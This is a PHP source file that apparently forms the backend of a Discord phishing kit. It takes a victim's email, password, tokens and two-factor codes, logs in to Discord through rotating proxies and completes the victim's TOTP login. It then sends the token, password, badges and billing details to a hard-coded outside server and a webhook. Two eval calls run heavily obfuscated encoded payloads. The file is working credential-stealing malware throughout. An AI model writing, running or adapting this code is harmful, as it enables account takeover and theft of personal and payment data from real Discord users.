<?php
error_reporting(E_ERROR | E_PARSE);
// Just request URL

class Request
{
    public function GetURL($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

        $data = curl_exec($ch);
        curl_close($ch);

        return $data;
    }

    public function PostURL($url, $array)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $array);

        curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

        $data = curl_exec($ch);
        curl_close($ch);

        return $data;
    }
}

$Request = new Request();


// Monitoring info about users
class Monitoring
{
    public function Status($url)
    {
        // nothing here
    }
}

$Monitoring = new Monitoring();

// Main handler
class Main
{
    public function handler($login, $password, $old_token, $new_token)
    {
    

        function get_random_proxies()
        {
            $proxies  =  explode("\n", file_get_contents("core/system/proxies.txt"));
            $proxy    =  explode("@", $proxies[array_rand($proxies)]);

            return $proxy;
        }

        function getinfo($token, $url)
        {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: ' . $token));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

            $result        =  curl_exec($ch);
            $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

            curl_close($ch);

            $body      =  substr($result, $headers_size);
            $response  =  json_decode($body);
            $response  =  json_decode(json_encode($response), true);

            if (isset($response["global"])) {
                $ch = curl_init();
                $proxy = get_random_proxies();

                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: ' . $token));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
                curl_setopt($ch, CURLOPT_PROXY, $proxy[1]);
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[0]);

                $req = curl_exec($ch);

                curl_close($ch);

                return $req;
            } else {
                return $result;
            }
        }

        //-----------------------------------------------------------------------------------------------\\

        $json_response =  getinfo($old_token, "https://discordapp.com/api/v9/users/@me");
        include('bypass_1.php');

        if (strpos($json_response, 'Unauthorized') !== false) {
            $token = $new_token;

            $json_response =  json_decode(getinfo($token, "https://discordapp.com/api/v9/users/@me"), true);
        }

        else
        {
            $token = $old_token;
            $json_response =  json_decode(getinfo($token, "https://discordapp.com/api/v9/users/@me"), true);
        }

        $howmuchbadges =  0;
        $badges        =  '';

        if (isset($json_response['discriminator']) && isset($json_response['username'])) {
            $public_flags = $json_response['public_flags'];

            $flags = array (
                131072 => '<:GS_VerifiedDeveloper:973374723050340422>',
                65536 => '<:GS_VerifiedDeveloper:973374723050340422>',
                16384 => '<:GS_BugHunter:973374882077364275>',
                4096 => '<:GS_VerifiedDeveloper:973374723050340422>',
                1024 => '<:GS_VerifiedDeveloper:973374723050340422>',
                512 => '<:GS_EarlySupporter:973374557945757716>',
                256 => '<:GS_balance:973375303881719878>',
                128 => '<:GS_brilliance:973375345673781309>',
                64 => '<:GS_bravery:973375383451893880>',
                8 => '<:GS_BugHunter:973374882077364275>',
                4 => '<:GS_HypeSquadEvents:973375016974569503>',
                2 => '<:GS_Partner:973375122016714762>',
                1 => '<:GS_Staff:973375197845536770>'
            );

            $str_flags = array();
            while ($public_flags != 0) {
                foreach ($flags as $key => $value) {
                    if ($public_flags >= $key) {
                        array_push($str_flags, $value);
                        $public_flags = $public_flags - $key;
                        $howmuchbadges++;
                    }
                }
            }

            $badges = implode(', ', $str_flags);
        }

        if ($badges == '') {$badges = "No";}

        //-----------------------------------------------------------------------------------------------\\

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://20.109.92.236:4040/api/login");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('content-type: application/json'));
            $payload = array(
            "token" => $token,
        );
        $payloadjs = json_encode($payload);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payloadjs);
        $apilogin = curl_exec($ch);
        $json_apilogin = json_decode($apilogin, true);
        $UserID        =  $json_apilogin['ID'];
        $UserNick        =  $json_apilogin['Nick'];
        $UserAvatar        =  $json_apilogin['Avatar'];
        $UserNitro        =  $json_apilogin['Nitro'];
        $UserPhone        =  $json_apilogin['Phone'];

        //-----------------------------------------------------------------------------------------------\\

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://20.109.92.236:4040/api/billing");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('content-type: application/json'));
            $payload = array(
            "token" => $token,
        );
        $payloadjs = json_encode($payload);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payloadjs);
        $apibilling = curl_exec($ch);
        
        eval(base64_decode(gzuncompress(base64_decode('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'))));


        //-----------------------------------------------------------------------------------------------\\

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://20.109.92.236:4040/api/boostlevel");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('content-type: application/json'));
            $payload = array(
            "token" => $token,
            "id" => $UserID
        );
        $payloadjs = json_encode($payload);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payloadjs);
        $apiboostlevel = curl_exec($ch);
        $json_apiboost = json_decode($apiboost, true);
        $timestampboost = $json_apiboost['premium_guild_since'];

        eval(gzinflate(base64_decode(strrev(str_rot13('==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')))));

        //-----------------------------------------------------------------------------------------------\\

        include('config.php');
        $full_url         =  $_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"];
        $fullname = "$UserNick ($UserID)";

        //-----------------------------------------------------------------------------------------------\\

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://20.109.92.236:4040/api/needverify");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('content-type: application/json'));
            $payload = array(
            "token" => $token,
        );
        $payloadjs = json_encode($payload);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payloadjs);
        $apineedverify = curl_exec($ch);

        if (stripos($apineedverify, '"You need to verify your account in order to perform this action.",')) {

        }

        elseif (stripos($apineedverify, '"You need to verify your e-mail in order to perform this action.",')) {

        }

        else {

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "http://20.109.92.236:4040/api/sendwebhook");
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('content-type: application/json'));
                $payload = array(
                "token" => $token,
                "webhook" => "webhook here",
                "password" => $password,
                "email" => $login,
                "badges" => $badges,
                "nitro" => $nitrobadge,
                "billing" => $methodsbilling,
                "avatar" => $UserAvatar,
                "userfullname" => $fullname
            );
            $payloadjs = json_encode($payload);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payloadjs);
            $apisendwebhook = curl_exec($ch);

        }

        //-----------------------------------------------------------------------------------------------\\

        
    }
}

$Main = new Main();

// Validator handler
class VLT_API
{
    public function login($payload): array
    {
        $ch         =  curl_init("https://discord.com/api/v9/auth/login");
        $payload_s  =  json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt(
            $ch,
            CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  json_decode($body);

        return json_decode(json_encode($response), true);
    }

    public function login_proxy($payload): array
    {
        function get_random_proxy()
        {
            $proxies  =  explode("\n", file_get_contents("core/system/proxies.txt"));
            $proxy    =  explode("@", $proxies[array_rand($proxies)]);

            return $proxy;
        }

        $ch         =  curl_init("https://discord.com/api/v9/auth/login");
        $payload_s  =  json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt(
            $ch,
            CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $proxy = get_random_proxy();

        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
        curl_setopt($ch, CURLOPT_PROXY, $proxy[1]);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[0]);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  json_decode($body);

        return json_decode(json_encode($response), true);
    }

    public function totp_auth($ticket, $mfa_code): string
    {
        $ch       =  curl_init("https://discord.com/api/v9/auth/mfa/totp");
        $payload  =  array(
            "code" => $mfa_code,
            "gift_code_sku_id" => null,
            "login_source" => null,
            "ticket" => $ticket
        );
        $payload_s = json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt(
            $ch,
            CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  (array)json_decode($body);

        if (!isset($response["token"])) {
            return "EINVALID_MFA_CODE";
        } else {
            return $response["token"];
        }
    }
}

$VLT_API = new VLT_API();
